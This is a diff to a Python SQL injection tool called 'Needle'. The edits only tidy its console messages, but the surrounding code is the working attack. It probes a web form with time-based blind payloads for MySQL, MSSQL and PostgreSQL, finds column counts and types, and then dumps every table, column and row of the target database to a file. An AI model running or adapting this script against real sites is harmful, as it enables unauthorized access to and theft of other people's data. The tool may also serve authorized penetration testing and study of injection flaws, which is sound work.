@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 '''
-Needle is a python3 script which performs sql injection. It currently supports 
+Needle is a python3 script which performs sql injection. It currently supports
 mysql, postgresql and mssql injection.
 
 Copyright © 2018 Konstantinos Sarantopoulos
@@ -100,9 +100,9 @@ print ("\n---Needle started---")
 #check for mysql injection
 for injection in "'", '"', "", "')", '")', ")":
 	if injection == "":
-		print ("attempting mysql empty injection...")
+		print ("attempting mysql empty injection...", end = " ")
 	else:
-		print ("attempting mysql " + injection + " injection...")
+		print ("attempting mysql " + injection + " injection...", end = " ")
 	query = valid_search + injection + " and 1=sleep(2);#"
 	parameters[asterisk] = query
 	start = time.time()
@@ -114,26 +114,20 @@ for injection in "'", '"', "", "')", '")', ")":
 		req = requests.post(url, cookies=cookies, data=parameters)
 	end = time.time()
 	if end - start < 3 and end - start > 1.9:
-		if injection == "":
-			print ("mysql empty injection SUCCESSFUL")
-		else:
-			print ("mysql " + injection + " injection SUCCESSFUL")
+		print ("SUCCESSFUL")
 		inject = injection
 		server = "mysql"
 		break
 	else:
-		if injection == "":
-			print ("mysql empty injection unsuccessful")
-		else:
-			print ("mysql " + injection + " injection unsuccessful")
+		print ("unsuccessful")
 #check for mssql injection
 for injection in "'", '"', "", "')", '")', ")":
 	if server != 0:
 		break
 	if injection == "":
-		print ("attempting mssql empty injection...")
+		print ("attempting mssql empty injection...", end = " ")
 	else:
-		print ("attempting mssql " + injection + " injection...")
+		print ("attempting mssql " + injection + " injection...", end = " ")
 	query = [valid_search + injection + " declare @i int select @i = 0 while @i < 10000000 begin select @i = @i + 1 end print @i--", \
 	valid_search + injection + " waitfor delay \'00:00:02\'--", valid_search + injection + ' waitfor delay \"00:00:02\"--']
 	for i in range (0, len(query)):
@@ -147,18 +141,13 @@ for injection in "'", '"', "", "')", '")', ")":
 			req = requests.post(url, cookies=cookies, data=parameters)
 		end = time.time()
 		if end - start > 1.9:
-			if injection == "":
-				print ("mssql empty injection SUCCESSFUL")
-			else:
-				print ("mssql " + injection + " injection SUCCESSFUL")
+			print ("SUCCESSFUL")
 			inject = injection
 			server = "mssql"
 			mssleep = i
 			break
-		elif injection == "" and i == len(query) - 1:
-			print ("mssql empty injection unsuccessful")
 		elif i == len(query) - 1:
-			print ("mssql " + injection + " injection unsuccessful")
+			print ("unsuccessful")
 #find the number of columns presented per result for mysql and mssql
 if server in ["mysql", "mssql"]:
 	print ("finding the number of columns presented per result...")
@@ -193,9 +182,9 @@ for injection in "'", "", "')", ')':
 	if server != 0:
 		break
 	if injection == "":
-		print ("attempting postgresql empty injection...")
+		print ("attempting postgresql empty injection...", end = " ")
 	else:
-		print ("attempting postgresql " + injection + " injection...")
+		print ("attempting postgresql " + injection + " injection...", end = " ")
 	j = "null"
 	num_col = 1
 	while True:
@@ -210,19 +199,13 @@ for injection in "'", "", "')", ')':
 			req = requests.post(url, cookies=cookies, data=parameters)
 		end = time.time()
 		if end - start < 3 and end - start > 1.9:
-			if injection == "":
-				print ("postgresql empty injection SUCCESSFUL")
-			else:
-				print ("postgresql " + injection + " injection SUCCESSFUL")
+			print ("SUCCESSFUL")
 			inject = injection
 			server = "postgresql"
 			print ("the amount of columns presented per result is : " + str(num_col))
 			break
 		elif num_col == 20:
-			if injection == "":
-				print ("postgresql empty injection unsuccessful")
-			else:
-				print ("postgresql " + injection + " injection unsuccessful")
+			print ("unsuccessful")
 			break
 		num_col += 1
 		j += ",null"
@@ -232,7 +215,7 @@ if server == 0:
 	sys.exit()
 #find the type of the columns for postgresql and mssql
 if server in ["postgresql", "mssql"]:
-	print ("finding the type of the columns presented per result...")
+	print ("finding the type of the columns presented per result...", end = " ")
 	type = str()
 	if server == "postgresql":
 		order_list = ["chr(110) || chr(101) || chr(101) || chr(100) || chr(108) || chr(101)"]
@@ -278,12 +261,12 @@ if server in ["postgresql", "mssql"]:
 		if count > len(order_list) - 1:
 			break
 	if len(type) > 0:
-		print ("found the type of the columns presented per result")
+		print ("done")
 	else:
-		print ("couldn't find the type of the columns presented per result, exiting")
+		print ("failed, exiting")
 		sys.exit()
 #find all the tables of the current database
-print ("finding all the tables of the current database...")
+print ("finding all the tables of the current database...", end = " ")
 if server == "mysql":
 	number = "TABLE_NAME"
 	for i in range(0, num_col - 1):
@@ -314,12 +297,12 @@ for i in response:
 	tables += " " + table_name
 tables = tables.split()
 if len(tables) > 0:
-	print ("tables found :", len(tables) - 1)
+	print ("found :", len(tables))
 else:
-	print ("tables not found, exiting")
+	print ("failed, exiting")
 	sys.exit()
 #find all the columns of the current database
-print ("finding all the columns...")
+print ("finding all the columns...", end = " ")
 if server == "mysql":
 	number = "COLUMN_NAME"
 	for i in range(0, num_col - 1):
@@ -350,9 +333,9 @@ for a in response:
 	columns += " " + column_name
 columns = columns.split()
 if len(columns) > 0:
-	print ("columns found :", len(columns) - 1)
+	print ("found :", len(columns))
 else:
-	print ("columns not found, exiting")
+	print ("failed, exiting")
 	sys.exit()
 #find all the rows of the current database
 for i in range(0, len(tables)):
@@ -399,7 +382,7 @@ for i in range(0, len(tables)):
 
 #---print end result and save results
 if len(info) > 0:
-	print ("sql injection SUCCESSFUL, saving results...")
+	print ("sql injection SUCCESSFUL, saving results and exiting")
 	save = open(file, 'a')
 	try:
 		user
